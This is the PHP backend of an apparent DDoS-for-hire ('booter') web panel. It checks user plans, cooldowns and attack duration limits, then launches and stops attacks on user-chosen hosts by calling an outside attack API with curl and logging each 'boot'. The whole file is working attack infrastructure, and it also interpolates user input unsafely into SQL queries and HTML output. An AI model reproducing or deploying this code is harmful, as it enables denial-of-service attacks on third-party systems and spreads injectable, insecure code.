<?php 

 // Complexx
 
 require '../complex/configuration.php';
 require '../complex/init.php';
 $type = $_GET['type'];
 session_start();
 $type = $_GET['type'];
 $username = $_SESSION['username'];
           

                            if ($type == 'start' || $type == 'renew'){
		
		if ($type == 'start') {

		$cooldowncheck2 = $odb->prepare("SELECT date FROM logs WHERE user = ? ORDER BY id DESC LIMIT 1");
        $cooldowncheck2->execute(array($_SESSION['username'])); 
        $checkcool = $cooldowncheck2->fetchColumn();
        $dtimer = time() - 10;
        $timeleft = $checkcool - $dtimer;
        $correct = gmdate("s", $timeleft);

        $cooldowncheck = $odb->prepare("SELECT COUNT(*) FROM logs WHERE user = ? AND date > ?");
        $cooldowncheck->execute(array($_SESSION['username'], time() - 10));
        if($cooldowncheck->fetchColumn() > 0){
echo ' 
									<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> Spam Protection: You need Wait '.$correct.' Seconds To Send Your Next Attack, Now Servers Will Have More Power Without Spam.</span>
			</div></div>';
die();
		}
		
			$host   = $_GET['host'];
			$mode    = $_GET['mode'];			
			$time   = intval($_GET['time']);
			$method = $_GET['method'];
			$rate    = $_GET['ratelimit'];
			$origin    = $_GET['origin'];
			$post    = $_GET['post'];
			$vip    = 1;
			$port    = 80;
			
			$totalservers = 1;

			if ($vip == "1") {
				if ($user -> isAdmin($odb) || $user -> isVIP($odb) || $user -> isSupporter($odb))  {
					// okay
				} else {
					
					echo ' 
					
					
										<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> You are not VIP.</span>
			</div></div>
				';
die();
				}
			}
			
		if (!$user->hasMembership($odb)) {
			
			echo ' 
			
							<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> You need plan a to use this.</span>
			</div></div>
			';
die();
		}

			if (empty($host) || empty($time) || empty($mode) || empty($method) || empty($origin) || empty($rate)) {
				
							echo ' 
							<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> Please verify all fields</span>
			</div></div>
					';
die();
			}

		

			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$countMethod = $SQL -> fetchColumn(0);
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$type = $SQL -> fetchColumn(0);
			if ($type == 'layer7') {
				if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
					die(error('Host is not a valid URL'));
				}


				$parameters = array(".gov", ".edu", "$", "{", "<");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
						die('You are not allowed to attack these websites');
					}
				}

			} 
			
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);
			if ($countBlacklist > 0) {
				
				echo ' 
				
<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> Host is blacklisted</span>
			</div></div>
				
				';
die();
			}
			
		} else {

			$renew     = intval($_GET['id']);
			$SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
			$SQLSelect -> execute(array(':renew' => $renew));
		
			while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
				$host   = $show['ip'];
				$port   = $show['port'];
				$time   = $show['time'];
				$vip   = $show['vip'];
				$method = $show['method'];
				$totalservers = $show['totalservers'];
				$userr  = $show['user'];
			}

			if (!($userr == $username) && !$user->isAdmin($odb)) {
				
				echo '

<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> This is not your attack</span>
			</div></div>
				';
die();
			}
		}

		if ($user->hasMembership($odb)) {
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $username));
			$countRunning = $SQL -> fetchColumn(0);
			if ($countRunning >= $stats->concurrents($odb, $username)) {
				
				echo '

	<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> you have too many boots running</span>
			</div></div>
				';
die();
			}
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = '$host' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array());
			$countRunningH = $SQL -> fetchColumn(0);
			//Disabled
		}

			//Check Planss xDD
		
			//Addons Servers
			$SQL = $odb->prepare("SELECT `aserv` FROM `users` WHERE `users`.`ID` = :id");
			$SQL ->execute(array(':id' => $_SESSION['ID']));
			$aserv = $SQL -> fetchColumn(0);
		    //Fin Addons Servers
		
		$SQL = $odb->prepare("SELECT `plans`.`totalservers` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQL ->execute(array(':id' => $_SESSION['ID']));
		$maxservers = $SQL->fetchColumn(0)+$aserv;
		
		//Addons Time
			$SQL = $odb->prepare("SELECT `atime` FROM `users` WHERE `users`.`ID` = :id");
			$SQL ->execute(array(':id' => $_SESSION['ID']));
			$atime = $SQL -> fetchColumn(0);
		//Fin Addons Time
			
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
		$maxTime = $SQLGetTime->fetchColumn(0)+$atime;

		if ($time > $maxTime){
			
			echo ' 
			<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
		
			<div class="alert-message">
			  <span><strong>ERROR!</strong> Your max boot time has been exceeded.</span>
			</div></div>
			
			';
die();
		}
		if ($totalservers > $maxservers){
		
			echo ' 
			
			<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> Your servers per attack has been exceeded'. $maxservers. '</span>
			</div></div>
			
			';
die();
		}
		if($time < 10){
			
		
						echo '


<div class="alert alert-outline-danger alert-dismissible">
			 <button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> Your attack must be over 10 seconds long.</span>
			</div></div>
						';
die();
		}
        $i = 0;
		
		if ($vip == '1') { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method AND `status` = 1 ORDER BY ABS(`lastUsed`) ASC LIMIT $totalservers");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		}
		else { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method AND `status` = 1 ORDER BY ABS(`lastUsed`) ASC LIMIT $totalservers");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		}
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

			 $getServerName = $odb -> prepare("SELECT `name` FROM `servers` WHERE (`lastUsed` < UNIX_TIMESTAMP() AND `lastUsed` != 0) ORDER BY RAND() LIMIT 1");
             $getServerName -> execute();
             $serverName = $getServerName -> fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
		
			
            $i++;
           $apiurl = 'http://key.dranksecurity.xyz/break1.php?qloq&host='. $host .'&time='. $time .'&method='. $method .'&mode='. $mode . '&ratelimit=' . $rate . '&postdata=' . $post . '&origin=' . $origin . '&servers=5';
			
           # api for break
                                            $curl = curl_init();
                                            curl_setopt($curl, CURLOPT_URL, $apiurl);
                                            curl_setopt($curl, CURLOPT_HEADER, false);
                                            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                                            curl_setopt($curl, CURLOPT_BINARYTRANSFER, true);
                                            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
                                            $result = curl_exec($curl);
											curl_close($curl);


        }
		
		

        if ($i == 0) {
            
			echo ' 
			
			 <div class="alert alert-outline-danger alert-dismissible">
			<button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-times"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>ERROR!</strong> No open slots for your attack</span>
			</div></div>';
die();
        }

		$handlers     = @implode(",", $handler);

		$chart = date("d-m");
		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, '80', :time, :method, UNIX_TIMESTAMP(), :chart, '0', 'ADVANCE', :vip, :totalservers, '0')");
		$insertLogSQL -> execute(array(':user' => $username, ':ip' => $host,  ':time' => $time, ':method' => $method, ':chart' => $chart,  ':vip' => $vip, ':totalservers' => $totalservers));

		$updateServer = $odb -> prepare("UPDATE `api` SET `lastUsed` = UNIX_TIMESTAMP()+:time WHERE `name` = :name");
        $updateServer -> execute(array(':name' => $handlers, ':time' => $time));
		  
        $updateserverip = $odb -> prepare("UPDATE `api` SET `lastip` = ? WHERE `name` = ?");
        $updateserverip -> execute(array($host, $handlers));
if($vip == "1"){
	$vip = 'ViP';
}else{
	$vip = 'Normal';
}
		
		echo '<div class="alert alert-outline-success alert-dismissible" role="alert">
			<button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-check"></i>
			</div>
			
			<div class="alert-message">
		<span><strong>SUCCESS!</strong> Attack sent to<br> Host: <font class="text-primary">'.$host.'</font> <br>Time: <font class="text-success">'.$time.'</font> <br>method: <font class="text-primary">'.$method.'</font> <br>mode: <font class="text-danger">'.$mode.'</font> <br> with ratelimit: <font class="text-warning">'.$rate.'</span>
			</div></div>';

	}

//Stop attack function
if ($type == 'stop') {
    $stop      = intval($_GET['id']);
    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			$host   = $show['ip'];
        $port   = $show['port'];
        $time   = $show['time'];
        $method = $show['method'];
        $handler = $show['handler'];
			
			
    }
	   $apiurl = 'http://key.dranksecurity.xyz/break1.php?qloq&host='. $host .'&time='. $time .'&method=STOP&mode=HTTP&ratelimit=false&postdata=false&origin=ALL&servers=5';
				
           # api for break
                                            $curl = curl_init();
                                            curl_setopt($curl, CURLOPT_URL, $apiurl);
                                            curl_setopt($curl, CURLOPT_HEADER, false);
                                            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                                            curl_setopt($curl, CURLOPT_BINARYTRANSFER, true);
                                            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
                                            $result = curl_exec($curl);
											curl_close($curl);

	echo ' <div class="alert alert-outline-success alert-dismissible" role="alert">
			<button type="button" class="close" data-dismiss="alert">&times;</button>
			
			<div class="alert-icon">
			 <i class="fa fa-check"></i>
			</div>
			
			<div class="alert-message">
			  <span><strong>SUCCESS!</strong> Attack <font class="text-danger">'.$host.'</font> Has Been Stopped!</span>
			</div></div>';
	
	

}
?>